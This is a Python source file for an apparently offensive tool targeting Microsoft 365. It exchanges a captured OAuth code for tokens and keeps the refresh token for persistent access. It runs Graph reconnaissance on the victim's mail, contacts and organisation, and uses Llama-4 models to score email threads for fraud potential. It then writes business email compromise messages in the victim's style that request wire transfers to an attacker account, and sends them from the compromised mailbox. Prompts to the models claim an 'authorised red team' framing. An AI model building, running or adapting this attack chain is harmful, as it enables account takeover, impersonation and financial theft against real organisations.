#!/usr/bin/env python3
"""
Phase 2+ : Autonomous Post‑Exploitation & BEC Automation
- Exchanges OAuth code for tokens
- Performs parallel Graph reconnaissance
- Uses Llama‑4 models for financial exposure analysis & BEC crafting
- Sends targeted BEC emails from compromised account
- Persists refresh token, supports token refresh, interactive menu
"""

import os
import sys
import json
import asyncio
import aiohttp
import requests
import time
from datetime import datetime, timedelta
from typing import List, Dict, Any, Tuple, Optional

from .constants import (
    CLIENT_ID, CLIENT_SECRET, REDIRECT_URI,
    GROQ_API_KEY, GROQ_ENDPOINT, SCOUT_MODEL, MAVERICK_MODEL,
    TOKEN_FILE,
)
from .privesc import run_privesc

if not GROQ_API_KEY:
    print("[!] GROQ_API_KEY environment variable not set.")
    sys.exit(1)

# ------------------------------------------------------------------
# Token management
# ------------------------------------------------------------------
class TokenManager:
    def __init__(self, token_file: str = TOKEN_FILE):
        self.token_file = token_file
        self.access_token = None
        self.refresh_token = None
        self.expires_at = 0  # Unix timestamp
        self.load_from_file()

    def load_from_file(self):
        if os.path.exists(self.token_file):
            try:
                with open(self.token_file, 'r') as f:
                    data = json.load(f)
                    self.access_token = data.get('access_token')
                    self.refresh_token = data.get('refresh_token')
                    self.expires_at = data.get('expires_at', 0)
                    print(f"[*] Loaded tokens from {self.token_file} (expires at {datetime.fromtimestamp(self.expires_at)})")
            except Exception as e:
                print(f"[-] Failed to load tokens: {e}")

    def save_to_file(self):
        data = {
            'access_token': self.access_token,
            'refresh_token': self.refresh_token,
            'expires_at': self.expires_at
        }
        with open(self.token_file, 'w') as f:
            json.dump(data, f, indent=2)
        print(f"[*] Tokens saved to {self.token_file}")

    def is_expired(self) -> bool:
        # Add 5-minute buffer
        return time.time() + 300 >= self.expires_at

    def refresh_access_token(self) -> bool:
        """Use refresh token to get a new access token."""
        if not self.refresh_token:
            print("[-] No refresh token available.")
            return False
        print("[*] Refreshing access token...")
        url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
        data = {
            "grant_type": "refresh_token",
            "refresh_token": self.refresh_token,
            "client_id": CLIENT_ID,
            "client_secret": CLIENT_SECRET,
        }
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        try:
            resp = requests.post(url, data=data, headers=headers)
            resp.raise_for_status()
            tokens = resp.json()
            self.access_token = tokens["access_token"]
            # Refresh token may be returned (sometimes new one)
            if "refresh_token" in tokens:
                self.refresh_token = tokens["refresh_token"]
            self.expires_at = time.time() + tokens["expires_in"]
            self.save_to_file()
            print("[+] Access token refreshed successfully.")
            return True
        except Exception as e:
            print(f"[-] Refresh failed: {e}")
            return False

    def set_from_code(self, code: str) -> bool:
        """Exchange authorization code for tokens."""
        print("[*] Exchanging code for tokens...")
        url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
        data = {
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": REDIRECT_URI,
            "client_id": CLIENT_ID,
            "client_secret": CLIENT_SECRET,
        }
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        try:
            resp = requests.post(url, data=data, headers=headers)
            resp.raise_for_status()
            tokens = resp.json()
            self.access_token = tokens["access_token"]
            self.refresh_token = tokens["refresh_token"]
            self.expires_at = time.time() + tokens["expires_in"]
            self.save_to_file()
            print(f"[+] Access token obtained (first 60 chars): {self.access_token[:60]}...")
            return True
        except Exception as e:
            print(f"[-] Exchange failed: {e}")
            return False

    def ensure_valid_token(self) -> bool:
        """Check token validity; refresh if needed."""
        if not self.access_token:
            print("[-] No access token. Please obtain a new code.")
            return False
        if self.is_expired():
            print("[!] Access token expired or expiring soon. Attempting refresh...")
            return self.refresh_access_token()
        return True

    def get_headers(self) -> Dict:
        """Return Authorization headers for Graph API."""
        return {"Authorization": f"Bearer {self.access_token}"}


# ------------------------------------------------------------------
# Step 2: Parallel Graph Reconnaissance
# ------------------------------------------------------------------
async def fetch_graph(session: aiohttp.ClientSession, token_mgr: TokenManager, endpoint: str) -> Dict:
    """Fetch one Graph endpoint with automatic token refresh on 401."""
    url = f"https://graph.microsoft.com/v1.0{endpoint}"
    headers = token_mgr.get_headers()
    async with session.get(url, headers=headers) as resp:
        if resp.status == 401 and token_mgr.refresh_access_token():
            # Retry with new token
            headers = token_mgr.get_headers()
            async with session.get(url, headers=headers) as resp2:
                if resp2.status == 200:
                    return await resp2.json()
                else:
                    return {"error": resp2.status, "text": await resp2.text()}
        if resp.status == 200:
            return await resp.json()
        else:
            return {"error": resp.status, "text": await resp.text()}

async def parallel_recon(token_mgr: TokenManager) -> Dict[str, Any]:
    """Run all reconnaissance calls in parallel."""
    endpoints = {
        "inbox_rules": "/me/mailFolders/inbox/messageRules",
        "contacts": "/me/contacts",
        "events": "/me/events",
        "sent_items": "/me/mailFolders/sentitems/messages?$top=50&$orderby=receivedDateTime desc",
        "mail_folders": "/me/mailFolders",
        "manager": "/me/manager",
        "direct_reports": "/me/directReports",
        "organization": "/organization",
    }
    async with aiohttp.ClientSession() as session:
        tasks = [fetch_graph(session, token_mgr, ep) for ep in endpoints.values()]
        results = await asyncio.gather(*tasks)
    return dict(zip(endpoints.keys(), results))

# ------------------------------------------------------------------
# Step 3: Llama‑4‑Scout – Financial Exposure & Vulnerability Scoring
# ------------------------------------------------------------------
def llamascout_analyse(token_mgr: TokenManager) -> Tuple[Dict, List[Dict]]:
    """
    1. Fetch recent emails (last 30 days, up to 500)
    2. Use Llama‑4‑Scout to extract financial entities and score each thread.
    Returns: (summary_dict, list_of_vulnerable_threads with score)
    """
    print("\n[Phase 3A] Llama‑4‑Scout: Analysing mailbox for financial exposure...")
    sys.stdout.flush() 
    time.sleep(2)
    # Ensure token is valid
    if not token_mgr.ensure_valid_token():
        return {}, []
    headers = token_mgr.get_headers()
    url = "https://graph.microsoft.com/v1.0/me/messages?$top=500&$select=subject,bodyPreview,receivedDateTime,conversationId&$orderby=receivedDateTime desc"
    resp = requests.get(url, headers=headers)
    if resp.status_code != 200:
        print(f"[-] Failed to fetch emails: {resp.status_code}")
        return {}, []
    emails = resp.json().get("value", [])

    # Group by conversationId to form threads
    threads = {}
    for m in emails:
        conv_id = m.get("conversationId", m["id"])
        if conv_id not in threads:
            threads[conv_id] = {
                "subject": m.get("subject", "No Subject"),
                "messages": [],
                "last_date": m["receivedDateTime"]
            }
        threads[conv_id]["messages"].append(m["bodyPreview"])
    # Keep only threads with at least 2 messages (conversations)
    threads = {k: v for k, v in threads.items() if len(v["messages"]) >= 2}

    # Prepare prompt for Llama‑4‑Scout
    thread_summaries = []
    for tid, thr in threads.items():
        thread_summaries.append({
            "id": tid,
            "subject": thr["subject"],
            "message_count": len(thr["messages"]),
            "last_date": thr["last_date"],
            "sample": thr["messages"][0][:500]  # first message preview
        })

    prompt_scout = f"""
You are a financial exposure analyst for an authorised red team assessment.  
Analyse the following email thread summaries and return a JSON with:

- "financial_entities": list of bank accounts, wire amounts, invoice numbers, payment terms.
- "vulnerability_score": integer 0-100 (how likely this thread can be exploited for BEC).
- "reason": short explanation.

Threads:
{json.dumps(thread_summaries, indent=2)[:6000]}

Return only valid JSON in the format:
{{"thread_id": {{"financial_entities": [...], "vulnerability_score": 0-100, "reason": "..."}}}}
"""

    # Call Groq with Scout model
    payload = {
        "model": SCOUT_MODEL,
        "messages": [{"role": "user", "content": prompt_scout}],
        "temperature": 0.3,
        "response_format": {"type": "json_object"}
    }
    headers_groq = {"Authorization": f"Bearer {GROQ_API_KEY}", "Content-Type": "application/json"}
    resp = requests.post(GROQ_ENDPOINT, json=payload, headers=headers_groq)
    if resp.status_code != 200:
        print(f"[-] Scout API error: {resp.text}")
        return {}, []
    result = resp.json()
    analysis = json.loads(result["choices"][0]["message"]["content"])

    # Build list of vulnerable threads with scores
    vulnerable = []
    for tid, data in analysis.items():
        if data.get("vulnerability_score", 0) > 30:
            vulnerable.append({
                "thread_id": tid,
                "subject": threads.get(tid, {}).get("subject", "Unknown"),
                "score": data["vulnerability_score"],
                "reason": data.get("reason", ""),
                "entities": data.get("financial_entities", [])
            })
    vulnerable.sort(key=lambda x: x["score"], reverse=True)

    summary = {
        "total_emails": len(emails),
        "total_threads": len(threads),
        "high_risk_threads": len(vulnerable),
        "top_financial_entities": [e for v in vulnerable[:5] for e in v.get("entities", [])][:10]
    }
    return summary, vulnerable

# ------------------------------------------------------------------
# Step 4: BEC crafting and sending
# ------------------------------------------------------------------
def llama_maverick_craft(thread: Dict, sender_context: Dict) -> str:
    """
    Use Llama‑4‑Maverick to generate a BEC email.
    """
    prompt = f"""
You are an authorised red teamer simulating a BEC attack.  
Craft a convincing phishing email that appears to come from the compromised account.

Victim's writing style (from recent sent emails):
- Sent items analysis shows: {sender_context.get('style', 'professional and concise')}
- Typical signature: {sender_context.get('signature', 'Best regards')}

Real conversation to hijack:
Subject: {thread['subject']}
Reason for vulnerability: {thread['reason']}
Financial entities seen: {thread.get('entities', [])}

The attacker controls an external bank account (for demo: IBAN: DEMO123456).  
The email must:
- Match the victim's style and signature.
- Request a wire transfer / payment to the attacker's account.
- Reference the real conversation to appear legitimate.
- Sound urgent but natural.

Write ONLY the email body (no extra commentary).  
Use proper line breaks and keep it under 250 words.
"""
    payload = {
        "model": MAVERICK_MODEL,
        "messages": [{"role": "user", "content": prompt}],
        "temperature": 0.8,
        "max_tokens": 600
    }
    headers = {"Authorization": f"Bearer {GROQ_API_KEY}", "Content-Type": "application/json"}
    resp = requests.post(GROQ_ENDPOINT, json=payload, headers=headers)
    if resp.status_code == 200:
        return resp.json()["choices"][0]["message"]["content"]
    else:
        print(f"[-] Maverick error: {resp.text}")
        return "Urgent: Please process the attached invoice. Payment details updated."

def send_email(token_mgr: TokenManager, to_recipient: str, subject: str, body: str) -> bool:
    """Send an email from the compromised account, with auto-refresh on 401."""
    if not token_mgr.ensure_valid_token():
        return False
    url = "https://graph.microsoft.com/v1.0/me/sendMail"
    headers = token_mgr.get_headers()
    headers["Content-Type"] = "application/json"
    payload = {
        "message": {
            "subject": subject,
            "body": {"contentType": "Text", "content": body},
            "toRecipients": [{"emailAddress": {"address": to_recipient}}]
        },
        "saveToSentItems": "true"
    }
    resp = requests.post(url, headers=headers, json=payload)
    if resp.status_code == 202:
        print(f"[+] Email sent to {to_recipient}")
        return True
    elif resp.status_code == 401 and token_mgr.refresh_access_token():
        # Retry once
        headers = token_mgr.get_headers()
        headers["Content-Type"] = "application/json"
        resp2 = requests.post(url, headers=headers, json=payload)
        if resp2.status_code == 202:
            print(f"[+] Email sent to {to_recipient} after token refresh")
            return True
        else:
            print(f"[-] Failed to send after refresh: {resp2.status_code} {resp2.text}")
            return False
    else:
        print(f"[-] Failed to send: {resp.status_code} {resp.text}")
        return False

# ------------------------------------------------------------------
# Interactive menu and main loop
# ------------------------------------------------------------------
def interactive_menu(token_mgr: TokenManager):
    """Display menu and handle user commands."""
    recon_results = None  # Store last recon results: (summary, vulnerable_threads, recon_data)
    while True:
        print("\n" + "="*50)
        print("  POST-EXPLOITATION COMMAND MENU")
        print("="*50)
        print("1. Refresh access token")
        print("2. Run full reconnaissance + BEC (top 2 threads)")
        print("3. Send BEC for a specific thread (by index)")
        print("4. Show last recon summary")
        print("5. List vulnerable threads (if recon done)")
        print("q. Quit (save tokens)")
        choice = input("\nEnter choice: ").strip().lower()

        if choice == '1':
            token_mgr.refresh_access_token()
        elif choice == '2':
            # Run recon
            print("\n[*] Starting reconnaissance...")
            recon = asyncio.run(parallel_recon(token_mgr))
            print(f"[+] Contacts: {len(recon.get('contacts', {}).get('value', []))}")
            print(f"[+] Events: {len(recon.get('events', {}).get('value', []))}")
            print(f"[+] Direct reports: {len(recon.get('direct_reports', {}).get('value', []))}")

            # Privesc engine: M365 escalation graph + Foundation-Sec-8B top-3 selection
            print("\n[Phase 2B] Privilege escalation analysis (M365 graph + Foundation-Sec-8B)...")
            privesc_result = run_privesc(token_mgr, recon)
            print(f"[+] Candidate paths found: {privesc_result.get('total_candidate_paths', 0)}")
            if privesc_result.get("status") == "success":
                for i, p in enumerate(privesc_result.get("top_3_paths", []), 1):
                    print(f"  [{i}] {p['name']} - PRIVESC probability: {p['probability_percent']}%")
                    print(f"      Impact: {p['impact']}")
            else:
                print(f"[-] Privesc analysis: {privesc_result.get('reason', 'failed')}")

            summary, vulnerable = llamascout_analyse(token_mgr)
            print("\n[Llama‑4‑Scout Analysis Summary]")
            print(json.dumps(summary, indent=2))
            if not vulnerable:
                print("[-] No vulnerable threads found.")
                recon_results = None
                continue
            print("\n[Top 5 Vulnerable Email Threads]")
            for i, vt in enumerate(vulnerable[:5], 1):
                print(f"{i}. Subject: {vt['subject']}")
                print(f"   Vulnerability: {vt['score']}% | Reason: {vt['reason'][:100]}...")
            # Store results
            recon_results = (summary, vulnerable, recon)

            # Ask to send top 2
            send_choice = input("\nSend BEC emails for top 2 threads? (y/n) [default y]: ").strip().lower()
            if send_choice != 'n':
                selected = vulnerable[:2]
                # Prepare sender context
                sent_msgs = recon.get('sent_items', {}).get('value', [])
                style_sample = ""
                signature = "Best regards"
                if sent_msgs:
                    last_sent = sent_msgs[0]
                    style_sample = last_sent.get('bodyPreview', '')[:300]
                    if "Regards" in style_sample or "Sincerely" in style_sample:
                        signature = style_sample.split("\n")[-2:] if "\n" in style_sample else "Regards"
                sender_context = {"style": style_sample, "signature": signature}

                for idx, vt in enumerate(selected, 1):
                    print(f"\n[Phase 3B] Crafting BEC email #{idx}...")
                    email_body = llama_maverick_craft(vt, sender_context)
                    print(f"\n--- Generated Email ---\n{email_body}\n---\n")
                    to_email = input(f"Enter recipient for this BEC (or Enter for attacker@demo.com): ").strip()
                    if not to_email:
                        to_email = "attacker@demo.com"
                    subject = f"RE: {vt['subject']}"
                    send_email(token_mgr, to_email, subject, email_body)
        elif choice == '3':
            if not recon_results or not recon_results[1]:
                print("[-] No vulnerable threads available. Run option 2 first.")
                continue
            vulnerable = recon_results[1]
            print("Available vulnerable threads:")
            for i, vt in enumerate(vulnerable, 1):
                print(f"{i}. {vt['subject']} (score: {vt['score']}%)")
            try:
                idx = int(input("Enter thread number: ")) - 1
                if idx < 0 or idx >= len(vulnerable):
                    print("Invalid index.")
                    continue
                vt = vulnerable[idx]
                # Prepare sender context (maybe from stored recon)
                recon = recon_results[2]
                sent_msgs = recon.get('sent_items', {}).get('value', [])
                style_sample = ""
                signature = "Best regards"
                if sent_msgs:
                    last_sent = sent_msgs[0]
                    style_sample = last_sent.get('bodyPreview', '')[:300]
                    if "Regards" in style_sample or "Sincerely" in style_sample:
                        signature = style_sample.split("\n")[-2:] if "\n" in style_sample else "Regards"
                sender_context = {"style": style_sample, "signature": signature}
                email_body = llama_maverick_craft(vt, sender_context)
                print(f"\n--- Generated Email ---\n{email_body}\n---\n")
                to_email = input("Enter recipient: ").strip()
                if not to_email:
                    to_email = "attacker@demo.com"
                subject = f"RE: {vt['subject']}"
                send_email(token_mgr, to_email, subject, email_body)
            except ValueError:
                print("Invalid input.")
        elif choice == '4':
            if recon_results:
                print("\n[Last Recon Summary]")
                print(json.dumps(recon_results[0], indent=2))
            else:
                print("[-] No recon data. Run option 2 first.")
        elif choice == '5':
            if not recon_results or not recon_results[1]:
                print("[-] No vulnerable threads. Run option 2 first.")
            else:
                vulnerable = recon_results[1]
                print("\n[Vulnerable Threads]")
                for i, vt in enumerate(vulnerable, 1):
                    print(f"{i}. Subject: {vt['subject']} (score: {vt['score']}%)")
        elif choice == 'q':
            print("[*] Exiting. Tokens saved.")
            token_mgr.save_to_file()
            sys.exit(0)
        else:
            print("Invalid choice. Please try again.")

# ------------------------------------------------------------------
# Main entry point
# ------------------------------------------------------------------
def main():
    print("\n" + "="*70)
    print(" PHASE 2+ : AUTOMATED POST‑EXPLOITATION & BEC")
    print("="*70)

    token_mgr = TokenManager()

    # If tokens exist and are still valid, offer to continue
    if token_mgr.access_token and not token_mgr.is_expired():
        print("[*] Found valid saved tokens.")
        use_saved = input("Use saved tokens? (y/n) [default y]: ").strip().lower()
        if use_saved != 'n':
            print("[*] Using saved tokens.")
            interactive_menu(token_mgr)
            return

    # Otherwise, get new code
    code = input("\nEnter OAuth code from listener: ").strip()
    if not code:
        print("[-] No code provided.")
        return

    if not token_mgr.set_from_code(code):
        return

    # After successful token exchange, go to interactive menu
    interactive_menu(token_mgr)


if __name__ == "__main__":
    main()